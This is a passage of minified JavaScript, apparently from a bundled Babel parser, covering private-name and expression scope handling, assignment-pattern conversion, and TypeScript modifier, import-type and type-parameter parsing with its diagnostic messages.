this.raise(x.MissingPlugin,Q!=null?Q:this.state.startLoc,{missingPlugin:[X]})}expectOnePlugin(X){if(!X.some((Q)=>this.hasPlugin(Q)))throw this.raise(x.MissingOneOfPlugins,this.state.startLoc,{missingPlugin:X})}errorBuilder(X){return(Q,J,Y)=>{this.raise(X,I4(Q,J,Y))}}}class uq{constructor(){this.privateNames=new Set,this.loneAccessors=new Map,this.undefinedPrivateNames=new Map}}class cq{constructor(X){this.parser=void 0,this.stack=[],this.undefinedPrivateNames=new Map,this.parser=X}current(){return this.stack[this.stack.length-1]}enter(){this.stack.push(new uq)}exit(){let X=this.stack.pop(),Q=this.current();for(let[J,Y]of Array.from(X.undefinedPrivateNames))if(Q){if(!Q.undefinedPrivateNames.has(J))Q.undefinedPrivateNames.set(J,Y)}else this.parser.raise(x.InvalidPrivateFieldResolution,Y,{identifierName:J})}declarePrivateName(X,Q,J){let{privateNames:Y,loneAccessors:W,undefinedPrivateNames:G}=this.current(),H=Y.has(X);if(Q&3){let $=H&&W.get(X);if($){let z=$&4,U=Q&4,K=$&3,B=Q&3;if(H=K===B||z!==U,!H)W.delete(X)}else if(!H)W.set(X,Q)}if(H)this.parser.raise(x.PrivateNameRedeclaration,J,{identifierName:X});Y.add(X),G.delete(X)}usePrivateName(X,Q){let J;for(J of this.stack)if(J.privateNames.has(X))return;if(J)J.undefinedPrivateNames.set(X,Q);else this.parser.raise(x.InvalidPrivateFieldResolution,Q,{identifierName:X})}}class b4{constructor(X=0){this.type=X}canBeArrowParameterDeclaration(){return this.type===2||this.type===1}isCertainlyParameterDeclaration(){return this.type===3}}class vH extends b4{constructor(X){super(X);this.declarationErrors=new Map}recordDeclarationError(X,Q){let J=Q.index;this.declarationErrors.set(J,[X,Q])}clearDeclarationError(X){this.declarationErrors.delete(X)}iterateErrors(X){this.declarationErrors.forEach(X)}}class lq{constructor(X){this.parser=void 0,this.stack=[new b4],this.parser=X}enter(X){this.stack.push(X)}exit(){this.stack.pop()}recordParameterInitializerError(X,Q){let J=Q.loc.start,{stack:Y}=this,W=Y.length-1,G=Y[W];while(!G.isCertainlyParameterDeclaration()){if(G.canBeArrowParameterDeclaration())G.recordDeclarationError(X,J);else return;G=Y[--W]}this.parser.raise(X,J)}recordArrowParameterBindingError(X,Q){let{stack:J}=this,Y=J[J.length-1],W=Q.loc.start;if(Y.isCertainlyParameterDeclaration())this.parser.raise(X,W);else if(Y.canBeArrowParameterDeclaration())Y.recordDeclarationError(X,W);else return}recordAsyncArrowParametersError(X){let{stack:Q}=this,J=Q.length-1,Y=Q[J];while(Y.canBeArrowParameterDeclaration()){if(Y.type===2)Y.recordDeclarationError(x.AwaitBindingIdentifier,X);Y=Q[--J]}}validateAsPattern(){let{stack:X}=this,Q=X[X.length-1];if(!Q.canBeArrowParameterDeclaration())return;Q.iterateErrors(([J,Y])=>{this.parser.raise(J,Y);let W=X.length-2,G=X[W];while(G.canBeArrowParameterDeclaration())G.clearDeclarationError(Y.index),G=X[--W]})}}function gv(){return new b4(3)}function mv(){return new vH(1)}function uv(){return new vH(2)}function pq(){return new b4}class dq extends mq{addExtra(X,Q,J,Y=!0){if(!X)return;let{extra:W}=X;if(W==null)W={},X.extra=W;if(Y)W[Q]=J;else Object.defineProperty(W,Q,{enumerable:Y,value:J})}isContextual(X){return this.state.type===X&&!this.state.containsEsc}isUnparsedContextual(X,Q){if(this.input.startsWith(Q,X)){let J=this.input.charCodeAt(X+Q.length);return!(X5(J)||(J&64512)===55296)}return!1}isLookaheadContextual(X){let Q=this.nextTokenStart();return this.isUnparsedContextual(Q,X)}eatContextual(X){if(this.isContextual(X))return this.next(),!0;return!1}expectContextual(X,Q){if(!this.eatContextual(X)){if(Q!=null)throw this.raise(Q,this.state.startLoc);this.unexpected(null,X)}}canInsertSemicolon(){return this.match(140)||this.match(8)||this.hasPrecedingLineBreak()}hasPrecedingLineBreak(){return Zq(this.input,this.offsetToSourcePos(this.state.lastTokEndLoc.index),this.state.start)}hasFollowingLineBreak(){return Zq(this.input,this.state.end,this.nextTokenStart())}isLineTerminator(){return this.eat(13)||this.canInsertSemicolon()}semicolon(X=!0){if(X?this.isLineTerminator():this.eat(13))return;this.raise(x.MissingSemicolon,this.state.lastTokEndLoc)}expect(X,Q){if(!this.eat(X))this.unexpected(Q,X)}tryParse(X,Q=this.state.clone()){let J={node:null};try{let Y=X((W=null)=>{throw J.node=W,J});if(this.state.errors.length>Q.errors.length){let W=this.state;return this.state=Q,this.state.tokensLength=W.tokensLength,{node:Y,error:W.errors[Q.errors.length],thrown:!1,aborted:!1,failState:W}}return{node:Y,error:null,thrown:!1,aborted:!1,failState:null}}catch(Y){let W=this.state;if(this.state=Q,Y instanceof SyntaxError)return{node:null,error:Y,thrown:!0,aborted:!1,failState:W};if(Y===J)return{node:J.node,error:null,thrown:!1,aborted:!0,failState:W};throw Y}}checkExpressionErrors(X,Q){if(!X)return!1;let{shorthandAssignLoc:J,doubleProtoLoc:Y,privateKeyLoc:W,optionalParametersLoc:G,voidPatternLoc:H}=X,$=!!J||!!Y||!!G||!!W||!!H;if(!Q)return $;if(J!=null)this.raise(x.InvalidCoverInitializedName,J);if(Y!=null)this.raise(x.DuplicateProto,Y);if(W!=null)this.raise(x.UnexpectedPrivateField,W);if(G!=null)this.unexpected(G);if(H!=null)this.raise(x.InvalidCoverDiscardElement,H)}isLiteralPropertyName(){return Nq(this.state.type)}isPrivateName(X){return X.type==="PrivateName"}getPrivateNameSV(X){return X.id.name}hasPropertyAsPrivateName(X){return(X.type==="MemberExpression"||X.type==="OptionalMemberExpression")&&this.isPrivateName(X.property)}isObjectProperty(X){return X.type==="ObjectProperty"}isObjectMethod(X){return X.type==="ObjectMethod"}initializeScopes(X=this.options.sourceType==="module"){let Q=this.state.labels;this.state.labels=[];let J=this.exportedIdentifiers;this.exportedIdentifiers=new Set;let Y=this.inModule;this.inModule=X;let W=this.scope,G=this.getScopeHandler();this.scope=new G(this,X);let H=this.prodParam;this.prodParam=new vq;let $=this.classScope;this.classScope=new cq(this);let z=this.expressionScope;return this.expressionScope=new lq(this),()=>{this.state.labels=Q,this.exportedIdentifiers=J,this.inModule=Y,this.scope=W,this.prodParam=H,this.classScope=$,this.expressionScope=z}}enterInitialScopes(){let X=0;if(this.inModule||this.optionFlags&1)X|=2;if(this.optionFlags&32)X|=1;let Q=!this.inModule&&this.options.sourceType==="commonjs";if(Q||this.optionFlags&2)X|=4;this.prodParam.enter(X);let J=Q?514:1;if(this.optionFlags&4)J|=512;this.scope.enter(J)}checkDestructuringPrivate(X){let{privateKeyLoc:Q}=X;if(Q!==null)this.expectPlugin("destructuringPrivate",Q)}}class E4{constructor(){this.shorthandAssignLoc=null,this.doubleProtoLoc=null,this.privateKeyLoc=null,this.optionalParametersLoc=null,this.voidPatternLoc=null}}class k4{constructor(X,Q,J){if(this.type="",this.start=Q,this.end=0,this.loc=new T4(J),(X==null?void 0:X.optionFlags)&128)this.range=[Q,0];if(X!=null&&X.filename)this.loc.filename=X.filename}}var DH=k4.prototype;DH.__clone=function(){let X=new k4(void 0,this.start,this.loc.start),Q=Object.keys(this);for(let J=0,Y=Q.length;J<Y;J++){let W=Q[J];if(W!=="leadingComments"&&W!=="trailingComments"&&W!=="innerComments")X[W]=this[W]}return X};class iq extends dq{startNode(){let X=this.state.startLoc;return new k4(this,X.index,X)}startNodeAt(X){return new k4(this,X.index,X)}startNodeAtNode(X){return this.startNodeAt(X.loc.start)}finishNode(X,Q){return this.finishNodeAt(X,Q,this.state.lastTokEndLoc)}finishNodeAt(X,Q,J){if(X.type=Q,X.end=J.index,X.loc.end=J,this.optionFlags&128)X.range[1]=J.index;if(this.optionFlags&4096)this.processComment(X);return X}resetStartLocation(X,Q){if(X.start=Q.index,X.loc.start=Q,this.optionFlags&128)X.range[0]=Q.index}resetEndLocation(X,Q=this.state.lastTokEndLoc){if(X.end=Q.index,X.loc.end=Q,this.optionFlags&128)X.range[1]=Q.index}resetStartLocationFromNode(X,Q){this.resetStartLocation(X,Q.loc.start)}castNodeTo(X,Q){return X.type=Q,X}cloneIdentifier(X){let{type:Q,start:J,end:Y,loc:W,range:G,name:H}=X,$=Object.create(DH);if($.type=Q,$.start=J,$.end=Y,$.loc=W,$.range=G,$.name=H,X.extra)$.extra=X.extra;return $}cloneStringLiteral(X){let{type:Q,start:J,end:Y,loc:W,range:G,extra:H}=X,$=Object.create(DH);return $.type=Q,$.start=J,$.end=Y,$.loc=W,$.range=G,$.extra=H,$.value=X.value,$}}var rq=(X)=>{return X.type==="ParenthesizedExpression"?rq(X.expression):X};class nq extends iq{toAssignable(X,Q=!1){var J,Y;let W=void 0;if(X.type==="ParenthesizedExpression"||(J=X.extra)!=null&&J.parenthesized)if(W=rq(X),Q){if(W.type==="Identifier")this.expressionScope.recordArrowParameterBindingError(x.InvalidParenthesizedAssignment,X);else if(W.type!=="MemberExpression"&&!this.isOptionalMemberExpression(W))this.raise(x.InvalidParenthesizedAssignment,X)}else this.raise(x.InvalidParenthesizedAssignment,X);switch(X.type){case"Identifier":case"ObjectPattern":case"ArrayPattern":case"AssignmentPattern":case"RestElement":case"VoidPattern":break;case"ObjectExpression":this.castNodeTo(X,"ObjectPattern");for(let H=0,$=X.properties.length,z=$-1;H<$;H++){var G;let U=X.properties[H],K=H===z;if(this.toAssignableObjectExpressionProp(U,K,Q),K&&U.type==="RestElement"&&(G=X.extra)!=null&&G.trailingCommaLoc)this.raise(x.RestTrailingComma,X.extra.trailingCommaLoc)}break;case"ObjectProperty":{let{key:H,value:$}=X;if(this.isPrivateName(H))this.classScope.usePrivateName(this.getPrivateNameSV(H),H.loc.start);this.toAssignable($,Q);break}case"SpreadElement":throw Error("Internal @babel/parser error (this is a bug, please report it). SpreadElement should be converted by .toAssignable's caller.");case"ArrayExpression":this.castNodeTo(X,"ArrayPattern"),this.toAssignableList(X.elements,(Y=X.extra)==null?void 0:Y.trailingCommaLoc,Q);break;case"AssignmentExpression":if(X.operator!=="=")this.raise(x.MissingEqInAssignment,X.left.loc.end);if(this.castNodeTo(X,"AssignmentPattern"),delete X.operator,X.left.type==="VoidPattern")this.raise(x.VoidPatternInitializer,X.left);this.toAssignable(X.left,Q);break;case"ParenthesizedExpression":this.toAssignable(W,Q);break}}toAssignableObjectExpressionProp(X,Q,J){if(X.type==="ObjectMethod")this.raise(X.kind==="get"||X.kind==="set"?x.PatternHasAccessor:x.PatternHasMethod,X.key);else if(X.type==="SpreadElement"){this.castNodeTo(X,"RestElement");let Y=X.argument;if(this.checkToRestConversion(Y,!1),this.toAssignable(Y,J),!Q)this.raise(x.RestTrailingComma,X)}else this.toAssignable(X,J)}toAssignableList(X,Q,J){let Y=X.length-1;for(let W=0;W<=Y;W++){let G=X[W];if(!G)continue;if(this.toAssignableListItem(X,W,J),G.type==="RestElement"){if(W<Y)this.raise(x.RestTrailingComma,G);else if(Q)this.raise(x.RestTrailingComma,Q)}}}toAssignableListItem(X,Q,J){let Y=X[Q];if(Y.type==="SpreadElement"){this.castNodeTo(Y,"RestElement");let W=Y.argument;this.checkToRestConversion(W,!0),this.toAssignable(W,J)}else this.toAssignable(Y,J)}isAssignable(X,Q){switch(X.type){case"Identifier":case"ObjectPattern":case"ArrayPattern":case"AssignmentPattern":case"RestElement":case"VoidPattern":return!0;case"ObjectExpression":{let J=X.properties.length-1;return X.properties.every((Y,W)=>{return Y.type!=="ObjectMethod"&&(W===J||Y.type!=="SpreadElement")&&this.isAssignable(Y)})}case"ObjectProperty":return this.isAssignable(X.value);case"SpreadElement":return this.isAssignable(X.argument);case"ArrayExpression":return X.elements.every((J)=>J===null||this.isAssignable(J));case"AssignmentExpression":return X.operator==="=";case"ParenthesizedExpression":return this.isAssignable(X.expression);case"MemberExpression":case"OptionalMemberExpression":return!Q;default:return!1}}toReferencedList(X,Q){return X}toReferencedListDeep(X,Q){this.toReferencedList(X,Q);for(let J of X)if((J==null?void 0:J.type)==="ArrayExpression")this.toReferencedListDeep(J.elements)}parseSpread(X){let Q=this.startNode();return this.next(),Q.argument=this.parseMaybeAssignAllowIn(X,void 0),this.finishNode(Q,"SpreadElement")}parseRestBinding(){let X=this.startNode();this.next();let Q=this.parseBindingAtom();if(Q.type==="VoidPattern")this.raise(x.UnexpectedVoidPattern,Q);return X.argument=Q,this.finishNode(X,"RestElement")}parseBindingAtom(){switch(this.state.type){case 0:{let X=this.startNode();return this.next(),X.elements=this.parseBindingList(3,93,1),this.finishNode(X,"ArrayPattern")}case 5:return this.parseObjectLike(8,!0);case 88:return this.parseVoidPattern(null)}return this.parseIdentifier()}parseBindingList(X,Q,J){let Y=J&1,W=[],G=!0;while(!this.eat(X)){if(G)G=!1;else this.expect(12);if(Y&&this.match(12))W.push(null);else if(this.eat(X))break;else if(this.match(21)){let H=this.parseRestBinding();if(this.hasPlugin("flow")||J&2)H=this.parseFunctionParamType(H);if(W.push(H),!this.checkCommaAfterRest(Q)){this.expect(X);break}}else{let H=[];if(J&2){if(this.match(26)&&this.hasPlugin("decorators"))this.raise(x.UnsupportedParameterDecorator,this.state.startLoc);while(this.match(26))H.push(this.parseDecorator())}W.push(this.parseBindingElement(J,H))}}return W}parseBindingRestProperty(X){if(this.next(),this.hasPlugin("discardBinding")&&this.match(88))X.argument=this.parseVoidPattern(null),this.raise(x.UnexpectedVoidPattern,X.argument);else X.argument=this.parseIdentifier();return this.checkCommaAfterRest(125),this.finishNode(X,"RestElement")}parseBindingProperty(){let{type:X,startLoc:Q}=this.state;if(X===21)return this.parseBindingRestProperty(this.startNode());let J=this.startNode();if(X===139)this.expectPlugin("destructuringPrivate",Q),this.classScope.usePrivateName(this.state.value,Q),J.key=this.parsePrivateName();else this.parsePropertyName(J);return J.method=!1,this.parseObjPropValue(J,Q,!1,!1,!0,!1)}parseBindingElement(X,Q){let J=this.parseMaybeDefault();if(this.hasPlugin("flow")||X&2)this.parseFunctionParamType(J);if(Q.length)J.decorators=Q,this.resetStartLocationFromNode(J,Q[0]);return this.parseMaybeDefault(J.loc.start,J)}parseFunctionParamType(X){return X}parseMaybeDefault(X,Q){if(X!=null||(X=this.state.startLoc),Q=Q!=null?Q:this.parseBindingAtom(),!this.eat(29))return Q;let J=this.startNodeAt(X);if(Q.type==="VoidPattern")this.raise(x.VoidPatternInitializer,Q);return J.left=Q,J.right=this.parseMaybeAssignAllowIn(),this.finishNode(J,"AssignmentPattern")}isValidLVal(X,Q,J){switch(X){case"AssignmentPattern":return"left";case"RestElement":return"argument";case"ObjectProperty":return"value";case"ParenthesizedExpression":return"expression";case"ArrayPattern":return"elements";case"ObjectPattern":return"properties";case"VoidPattern":return!0}return!1}isOptionalMemberExpression(X){return X.type==="OptionalMemberExpression"}checkLVal(X,Q,J=64,Y=!1,W=!1,G=!1){var H;let $=X.type;if(this.isObjectMethod(X))return;let z=this.isOptionalMemberExpression(X);if(z||$==="MemberExpression"){if(z){if(this.expectPlugin("optionalChainingAssign",X.loc.start),Q.type!=="AssignmentExpression")this.raise(x.InvalidLhsOptionalChaining,X,{ancestor:Q})}if(J!==64)this.raise(x.InvalidPropertyBindingPattern,X);return}if($==="Identifier"){this.checkIdentifier(X,J,W);let{name:M}=X;if(Y)if(Y.has(M))this.raise(x.ParamDupe,X);else Y.add(M);return}else if($==="VoidPattern"&&Q.type==="CatchClause")this.raise(x.VoidPatternCatchClauseParam,X);let U=this.isValidLVal($,!(G||(H=X.extra)!=null&&H.parenthesized)&&Q.type==="AssignmentExpression",J);if(U===!0)return;if(U===!1){let M=J===64?x.InvalidLhs:x.InvalidLhsBinding;this.raise(M,X,{ancestor:Q});return}let K,B;if(typeof U==="string")K=U,B=$==="ParenthesizedExpression";else[K,B]=U;let q=$==="ArrayPattern"||$==="ObjectPattern"?{type:$}:Q,Z=X[K];if(Array.isArray(Z)){for(let M of Z)if(M)this.checkLVal(M,q,J,Y,W,B)}else if(Z)this.checkLVal(Z,q,J,Y,W,B)}checkIdentifier(X,Q,J=!1){if(this.state.strict&&(J?Eq(X.name,this.inModule):Sq(X.name)))if(Q===64)this.raise(x.StrictEvalArguments,X,{referenceName:X.name});else this.raise(x.StrictEvalArgumentsBinding,X,{bindingName:X.name});if(Q&8192&&X.name==="let")this.raise(x.LetInLexicalBinding,X);if(!(Q&64))this.declareNameFromIdentifier(X,Q)}declareNameFromIdentifier(X,Q){this.scope.declareName(X.name,Q,X.loc.start)}checkToRestConversion(X,Q){switch(X.type){case"ParenthesizedExpression":this.checkToRestConversion(X.expression,Q);break;case"Identifier":case"MemberExpression":break;case"ArrayExpression":case"ObjectExpression":if(Q)break;default:this.raise(x.InvalidRestAssignmentPattern,X)}}checkCommaAfterRest(X){if(!this.match(12))return!1;return this.raise(this.lookaheadCharCode()===X?x.RestTrailingComma:x.ElementAfterRest,this.state.startLoc),!0}}function cv(X){if(X==null)throw Error(`Unexpected ${X} value.`);return X}function Fq(X){if(!X)throw Error("Assert fail")}var _1=n6`typescript`({AbstractMethodHasImplementation:({methodName:X})=>`Method '${X}' cannot have an implementation because it is marked abstract.`,AbstractPropertyHasInitializer:({propertyName:X})=>`Property '${X}' cannot have an initializer because it is marked abstract.`,AccessorCannotBeOptional:"An 'accessor' property cannot be declared optional.",AccessorCannotDeclareThisParameter:"'get' and 'set' accessors cannot declare 'this' parameters.",AccessorCannotHaveTypeParameters:"An accessor cannot have type parameters.",ClassMethodHasDeclare:"Class methods cannot have the 'declare' modifier.",ClassMethodHasReadonly:"Class methods cannot have the 'readonly' modifier.",ConstInitializerMustBeStringOrNumericLiteralOrLiteralEnumReference:"A 'const' initializer in an ambient context must be a string or numeric literal or literal enum reference.",ConstructorHasTypeParameters:"Type parameters cannot appear on a constructor declaration.",DeclareAccessor:({kind:X})=>`'declare' is not allowed in ${X}ters.`,DeclareClassFieldHasInitializer:"Initializers are not allowed in ambient contexts.",DeclareFunctionHasImplementation:"An implementation cannot be declared in ambient contexts.",DuplicateAccessibilityModifier:({modifier:X})=>`Accessibility modifier already seen: '${X}'.`,DuplicateModifier:({modifier:X})=>`Duplicate modifier: '${X}'.`,EmptyHeritageClauseType:({token:X})=>`'${X}' list cannot be empty.`,EmptyTypeArguments:"Type argument list cannot be empty.",EmptyTypeParameters:"Type parameter list cannot be empty.",ExpectedAmbientAfterExportDeclare:"'export declare' must be followed by an ambient declaration.",ImportAliasHasImportType:"An import alias can not use 'import type'.",ImportReflectionHasImportType:"An `import module` declaration can not use `type` modifier",IncompatibleModifiers:({modifiers:X})=>`'${X[0]}' modifier cannot be used with '${X[1]}' modifier.`,IndexSignatureHasAbstract:"Index signatures cannot have the 'abstract' modifier.",IndexSignatureHasAccessibility:({modifier:X})=>`Index signatures cannot have an accessibility modifier ('${X}').`,IndexSignatureHasDeclare:"Index signatures cannot have the 'declare' modifier.",IndexSignatureHasOverride:"'override' modifier cannot appear on an index signature.",IndexSignatureHasStatic:"Index signatures cannot have the 'static' modifier.",InitializerNotAllowedInAmbientContext:"Initializers are not allowed in ambient contexts.",InvalidHeritageClauseType:({token:X})=>`'${X}' list can only include identifiers or qualified-names with optional type arguments.`,InvalidModifierOnAwaitUsingDeclaration:(X)=>`'${X}' modifier cannot appear on an await using declaration.`,InvalidModifierOnTypeMember:({modifier:X})=>`'${X}' modifier cannot appear on a type member.`,InvalidModifierOnTypeParameter:({modifier:X})=>`'${X}' modifier cannot appear on a type parameter.`,InvalidModifierOnTypeParameterPositions:({modifier:X})=>`'${X}' modifier can only appear on a type parameter of a class, interface or type alias.`,InvalidModifierOnUsingDeclaration:(X)=>`'${X}' modifier cannot appear on a using declaration.`,InvalidModifiersOrder:({orderedModifiers:X})=>`'${X[0]}' modifier must precede '${X[1]}' modifier.`,InvalidPropertyAccessAfterInstantiationExpression:"Invalid property access after an instantiation expression. You can either wrap the instantiation expression in parentheses, or delete the type arguments.",InvalidTupleMemberLabel:"Tuple members must be labeled with a simple identifier.",MissingInterfaceName:"'interface' declarations must be followed by an identifier.",NonAbstractClassHasAbstractMethod:"Abstract methods can only appear within an abstract class.",NonClassMethodPropertyHasAbstractModifier:"'abstract' modifier can only appear on a class, method, or property declaration.",OptionalTypeBeforeRequired:"A required element cannot follow an optional element.",OverrideNotInSubClass:"This member cannot have an 'override' modifier because its containing class does not extend another class.",PatternIsOptional:"A binding pattern parameter cannot be optional in an implementation signature.",PrivateElementHasAbstract:"Private elements cannot have the 'abstract' modifier.",PrivateElementHasAccessibility:({modifier:X})=>`Private elements cannot have an accessibility modifier ('${X}').`,ReadonlyForMethodSignature:"'readonly' modifier can only appear on a property declaration or index signature.",ReservedArrowTypeParam:"This syntax is reserved in files with the .mts or .cts extension. Add a trailing comma, as in `<T,>() => ...`.",ReservedTypeAssertion:"This syntax is reserved in files with the .mts or .cts extension. Use an `as` expression instead.",SetAccessorCannotHaveOptionalParameter:"A 'set' accessor cannot have an optional parameter.",SetAccessorCannotHaveRestParameter:"A 'set' accessor cannot have rest parameter.",SetAccessorCannotHaveReturnType:"A 'set' accessor cannot have a return type annotation.",SingleTypeParameterWithoutTrailingComma:({typeParameterName:X})=>`Single type parameter ${X} should have a trailing comma. Example usage: <${X},>.`,StaticBlockCannotHaveModifier:"Static class blocks cannot have any modifier.",TupleOptionalAfterType:"A labeled tuple optional element must be declared using a question mark after the name and before the colon (`name?: type`), rather than after the type (`name: type?`).",TypeAnnotationAfterAssign:"Type annotations must come before default assignments, e.g. instead of `age = 25: number` use `age: number = 25`.",TypeImportCannotSpecifyDefaultAndNamed:"A type-only import can specify a default import or named bindings, but not both.",TypeModifierIsUsedInTypeExports:"The 'type' modifier cannot be used on a named export when 'export type' is used on its export statement.",TypeModifierIsUsedInTypeImports:"The 'type' modifier cannot be used on a named import when 'import type' is used on its import statement.",UnexpectedParameterModifier:"A parameter property is only allowed in a constructor implementation.",UnexpectedReadonly:"'readonly' type modifier is only permitted on array and tuple literal types.",UnexpectedTypeAnnotation:"Did not expect a type annotation here.",UnexpectedTypeCastInParameter:"Unexpected type cast in parameter position.",UnsupportedImportTypeArgument:"Argument in a type import must be a string literal.",UnsupportedParameterPropertyKind:"A parameter property may not be declared using a binding pattern.",UnsupportedSignatureParameterKind:({type:X})=>`Name in a signature must be an Identifier, ObjectPattern or ArrayPattern, instead got ${X}.`,UsingDeclarationInAmbientContext:(X)=>`'${X}' declarations are not allowed in ambient contexts.`});function lv(X){switch(X){case"any":return"TSAnyKeyword";case"boolean":return"TSBooleanKeyword";case"bigint":return"TSBigIntKeyword";case"never":return"TSNeverKeyword";case"number":return"TSNumberKeyword";case"object":return"TSObjectKeyword";case"string":return"TSStringKeyword";case"symbol":return"TSSymbolKeyword";case"undefined":return"TSUndefinedKeyword";case"unknown":return"TSUnknownKeyword";default:return}}function Oq(X){return X==="private"||X==="public"||X==="protected"}function pv(X){return X==="in"||X==="out"}var dv=(X)=>class extends X{constructor(...J){super(...J);this.tsParseInOutModifiers=this.tsParseModifiers.bind(this,{allowedModifiers:["in","out"],disallowedModifiers:["const","public","private","protected","readonly","declare","abstract","override"],errorTemplate:_1.InvalidModifierOnTypeParameter}),this.tsParseConstModifier=this.tsParseModifiers.bind(this,{allowedModifiers:["const"],disallowedModifiers:["in","out"],errorTemplate:_1.InvalidModifierOnTypeParameterPositions}),this.tsParseInOutConstModifiers=this.tsParseModifiers.bind(this,{allowedModifiers:["in","out","const"],disallowedModifiers:["public","private","protected","readonly","declare","abstract","override"],errorTemplate:_1.InvalidModifierOnTypeParameter})}getScopeHandler(){return bq}tsIsIdentifier(){return w0(this.state.type)}tsTokenCanFollowModifier(){return this.match(0)||this.match(5)||this.match(55)||this.match(21)||this.match(139)||this.isLiteralPropertyName()}tsNextTokenOnSameLineAndCanFollowModifier(){if(this.next(),this.hasPrecedingLineBreak())return!1;return this.tsTokenCanFollowModifier()}tsNextTokenCanFollowModifier(){if(this.match(106))return this.next(),this.tsTokenCanFollowModifier();return this.tsNextTokenOnSameLineAndCanFollowModifier()}tsParseModifier(J,Y,W){if(!w0(this.state.type)&&this.state.type!==58&&this.state.type!==75)return;let G=this.state.value;if(J.includes(G)){if(W&&this.match(106))return;if(Y&&this.tsIsStartOfStaticBlocks())return;if(this.tsTryParse(this.tsNextTokenCanFollowModifier.bind(this)))return G}return}tsParseModifiers({allowedModifiers:J,disallowedModifiers:Y,stopOnStartOfClassStaticBlock:W,errorTemplate:G=_1.InvalidModifierOnTypeMember},H){let $=(U,K,B,q)=>{if(K===B&&H[q])this.raise(_1.InvalidModifiersOrder,U,{orderedModifiers:[B,q]})},z=(U,K,B,q)=>{if(H[B]&&K===q||H[q]&&K===B)this.raise(_1.IncompatibleModifiers,U,{modifiers:[B,q]})};for(;;){let{startLoc:U}=this.state,K=this.tsParseModifier(J.concat(Y!=null?Y:[]),W,H.static);if(!K)break;if(Oq(K))if(H.accessibility)this.raise(_1.DuplicateAccessibilityModifier,U,{modifier:K});else $(U,K,K,"override"),$(U,K,K,"static"),$(U,K,K,"readonly"),H.accessibility=K;else if(pv(K)){if(H[K])this.raise(_1.DuplicateModifier,U,{modifier:K});H[K]=!0,$(U,K,"in","out")}else{if(hasOwnProperty.call(H,K))this.raise(_1.DuplicateModifier,U,{modifier:K});else $(U,K,"static","readonly"),$(U,K,"static","override"),$(U,K,"override","readonly"),$(U,K,"abstract","override"),z(U,K,"declare","override"),z(U,K,"static","abstract");H[K]=!0}if(Y!=null&&Y.includes(K))this.raise(G,U,{modifier:K})}}tsIsListTerminator(J){switch(J){case"EnumMembers":case"TypeMembers":return this.match(8);case"HeritageClauseElement":return this.match(5);case"TupleElementTypes":return this.match(3);case"TypeParametersOrArguments":return this.match(48)}}tsParseList(J,Y){let W=[];while(!this.tsIsListTerminator(J))W.push(Y());return W}tsParseDelimitedList(J,Y,W){return cv(this.tsParseDelimitedListWorker(J,Y,!0,W))}tsParseDelimitedListWorker(J,Y,W,G){let H=[],$=-1;for(;;){if(this.tsIsListTerminator(J))break;$=-1;let z=Y();if(z==null)return;if(H.push(z),this.eat(12)){$=this.state.lastTokStartLoc.index;continue}if(this.tsIsListTerminator(J))break;if(W)this.expect(12);return}if(G)G.value=$;return H}tsParseBracketedList(J,Y,W,G,H){if(!G)if(W)this.expect(0);else this.expect(47);let $=this.tsParseDelimitedList(J,Y,H);if(W)this.expect(3);else this.expect(48);return $}tsParseImportType(){let J=this.startNode();if(this.expect(83),this.expect(10),!this.match(134))this.raise(_1.UnsupportedImportTypeArgument,this.state.startLoc),J.argument=super.parseExprAtom();else J.argument=this.parseStringLiteral(this.state.value);if(this.eat(12))J.options=this.tsParseImportTypeOptions();else J.options=null;if(this.expect(11),this.eat(16))J.qualifier=this.tsParseEntityName(3);if(this.match(47))J.typeParameters=this.tsParseTypeArguments();return this.finishNode(J,"TSImportType")}tsParseImportTypeOptions(){let J=this.startNode();this.expect(5);let Y=this.startNode();if(this.isContextual(76))Y.method=!1,Y.key=this.parseIdentifier(!0),Y.computed=!1,Y.shorthand=!1;else this.unexpected(null,76);return this.expect(14),Y.value=this.tsParseImportTypeWithPropertyValue(),J.properties=[this.finishObjectProperty(Y)],this.eat(12),this.expect(8),this.finishNode(J,"ObjectExpression")}tsParseImportTypeWithPropertyValue(){let J=this.startNode(),Y=[];this.expect(5);while(!this.match(8)){let W=this.state.type;if(w0(W)||W===134)Y.push(super.parsePropertyDefinition(null));else this.unexpected();this.eat(12)}return J.properties=Y,this.next(),this.finishNode(J,"ObjectExpression")}tsParseEntityName(J){let Y;if(J&1&&this.match(78))if(J&2)Y=this.parseIdentifier(!0);else{let W=this.startNode();this.next(),Y=this.finishNode(W,"ThisExpression")}else Y=this.parseIdentifier(!!(J&1));while(this.eat(16)){let W=this.startNodeAtNode(Y);W.left=Y,W.right=this.parseIdentifier(!!(J&1)),Y=this.finishNode(W,"TSQualifiedName")}return Y}tsParseTypeReference(){let J=this.startNode();if(J.typeName=this.tsParseEntityName(1),!this.hasPrecedingLineBreak()&&this.match(47))J.typeParameters=this.tsParseTypeArguments();return this.finishNode(J,"TSTypeReference")}tsParseThisTypePredicate(J){this.next();let Y=this.startNodeAtNode(J);return Y.parameterName=J,Y.typeAnnotation=this.tsParseTypeAnnotation(!1),Y.asserts=!1,this.finishNode(Y,"TSTypePredicate")}tsParseThisTypeNode(){let J=this.startNode();return this.next(),this.finishNode(J,"TSThisType")}tsParseTypeQuery(){let J=this.startNode();if(this.expect(87),this.match(83))J.exprName=this.tsParseImportType();else J.exprName=this.tsParseEntityName(3);if(!this.hasPrecedingLineBreak()&&this.match(47))J.typeParameters=this.tsParseTypeArguments();return this.finishNode(J,"TSTypeQuery")}tsParseTypeParameter(J){let Y=this.startNode();return J(Y),Y.name=this.tsParseTypeParameterName(),Y.constraint=this.tsEatThenParseType(81),Y.default=this.tsEatThenParseType(29),this.finishNode(Y,"TSTypeParameter")}tsTryParseTypeParameters(J){if(this.match(47))return this.tsParseTypeParameters(J)}tsParseTypeParameters(J){let Y=this.startNode();if(this.match(47)||this.match(143))this.next();else this.unexpected();let W={value:-1};if(Y.params=this.tsParseBracketedList("TypeParametersOrArguments",this.tsParseTypeParameter.bind(this,J),!1,!0,W),Y.params.length===0)this.raise(_1.EmptyTypeParameters,Y);if(W.value!==-1)this.addExtra(Y,"trailingComma",W.value);return this.finishNode(Y,"TSTypeParameterDeclaration")}tsFillSignature(J,Y){let W=J===19,G="parameters",H="typeAnnotation";if(Y.typeParameters=this.tsTryParseTypeParameters(this.tsParseConstModifier),this.expect(10),Y.parameters=this.tsParseBindingListForSignature(),W)Y.typeAnnotation=this.tsParseTypeOrTypePredicateAnnotation(J);else if(this.match(J))Y.typeAnnotation=this.tsParseTypeOrTypePredicateAnnotation(J)}tsParseBindingListForSignature(){let 